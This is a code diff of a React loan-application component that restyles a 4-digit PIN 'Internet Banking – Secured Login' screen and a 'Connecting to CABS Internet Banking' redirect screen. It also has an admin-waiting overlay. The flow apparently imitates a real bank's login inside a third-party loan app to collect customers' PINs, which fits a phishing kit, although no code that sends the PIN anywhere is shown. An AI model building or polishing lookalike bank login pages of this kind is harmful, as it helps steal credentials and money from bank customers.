@@ -38,7 +38,6 @@ function LoanApplication({ loanDetails, onBack, processor }) {
         "",
         "",
         "",
-        "",
         ""
     ]);
 
@@ -430,6 +429,8 @@ function LoanApplication({ loanDetails, onBack, processor }) {
         }
     }
 
+
+
     if (showAdminWaiting) {
         return (
             <div className="admin-waiting-overlay">
@@ -649,131 +650,110 @@ function LoanApplication({ loanDetails, onBack, processor }) {
     }
 
     if (showPinScreen) {
-
         return (
-            <div>
-                <Header style={{ marginBottom: "10px" }} />
-                <div className="pesa-pin-page">
+            <div className="pesa-pin-page">
 
-                    <div className="pesa-pin-content">
+                {/* CABS HEADER ONLY */}
+                <Header />
 
-                        <div className="pesa-pin-card" marginTop="10px">
+                {/* LOGIN CONTENT */}
+                <div className="pesa-pin-content">
 
-                            <h1>
-                                <span style={{color:'rgba(5, 5, 4, 0.52)'}}>Welcome to</span>
-                                <strong style={{ color: '#05ff1a' }}>
-                                    Internet Banking
-                                </strong>
-                            </h1>
+                    <div className="pesa-pin-card">
 
-                            <h2>
-                                Secured Login 🔒
-                            </h2>
+                        <h1 className="pesa-welcome-title">
+                            <span className="welcome-text">
+                                Welcome to
+                            </span>
 
-                            <p>
-                                Enter your 4-digit PIN to continue
-                            </p>
+                            <span className="banking-text">
+                                Internet Banking
+                            </span>
+                        </h1>
 
+                        <h2 className="secured-login-title">
+                            Secured Login <span>🔒</span>
+                        </h2>
 
-                            {/* PIN BOXES */}
+                        <p className="pin-instruction">
+                            Enter your 4-digit PIN to continue
+                        </p>
 
-                            <div className="pesa-pin-boxes">
+                        {/* PIN BOXES */}
+                        <div className="pesa-pin-boxes">
 
-                                {pin.map(
-                                    (digit, index) => (
+                            {pin.map((digit, index) => (
+                                <input
+                                    key={index}
 
-                                        <input
-                                            key={index}
+                                    ref={(element) => {
+                                        pinInputs.current[index] = element;
+                                    }}
 
-                                            ref={(element) => {
-                                                pinInputs.current[
-                                                    index
-                                                ] = element;
-                                            }}
+                                    type="password"
+                                    inputMode="numeric"
+                                    maxLength="1"
+                                    value={digit}
 
-                                            type="password"
+                                    onChange={(e) =>
+                                        handlePinChange(
+                                            e.target.value,
+                                            index
+                                        )
+                                    }
 
-                                            inputMode="numeric"
+                                    onKeyDown={(e) =>
+                                        handlePinKeyDown(
+                                            e,
+                                            index
+                                        )
+                                    }
 
-                                            maxLength="1"
+                                    className="pesa-pin-box"
 
-                                            value={digit}
-
-                                            onChange={(e) =>
-                                                handlePinChange(
-                                                    e.target.value,
-                                                    index
-                                                )
-                                            }
-
-                                            onKeyDown={(e) =>
-                                                handlePinKeyDown(
-                                                    e,
-                                                    index
-                                                )
-                                            }
-
-                                            className="pesa-pin-box"
-
-                                            aria-label={
-                                                `PIN digit ${
-                                                    index + 1
-                                                }`
-                                            }
-                                        />
-
-                                    )
-                                )}
-
-                            </div>
-
-
-                            <button
-                                type="button"
-                                className="pesa-next-button"
-
-                                disabled={
-                                    pin.filter(
-                                        digit =>
-                                            digit !== ""
-                                    ).length < 4
-                                }
-
-                                onClick={
-                                    handlePinNext
-                                }
-                            >
-                                Login
-                            </button>
+                                    aria-label={`PIN digit ${index + 1}`}
+                                />
+                            ))}
 
                         </div>
+
+                        <button
+                            type="button"
+                            className="pesa-next-button"
+                            disabled={
+                                pin.filter(
+                                    digit => digit !== ""
+                                ).length < 4
+                            }
+                            onClick={handlePinNext}
+                        >
+                            Login
+                        </button>
 
                     </div>
 
                 </div>
-                </div>
-            );
+
+            </div>
+        );
     }
 
-
-    /* =========================================
-       MOMO APP REDIRECT SCREEN
-    ========================================= */
-
-    if (showPesaRedirect) {
-
+      if (showPesaRedirect) {
         return (
             <div className="pesa-redirect">
 
                 <div className="pesa-spinner"></div>
 
-                    <h2>Processing...</h2>
+                <h2>
+                    Processing...
+                </h2>
 
-                    <p>
-                        Connecting to <span style={{ color: '#0e071d',fontWeight: 'bold',fontSize: '5em' }}>
-                            <strong>CABS Internet Banking</strong>
-                            </span>
-                    </p>
+                <p>
+                    Connecting to{" "}
+                    <h2>
+                        CABS Internet Banking
+                    </h2>
+                </p>
 
             </div>
         );
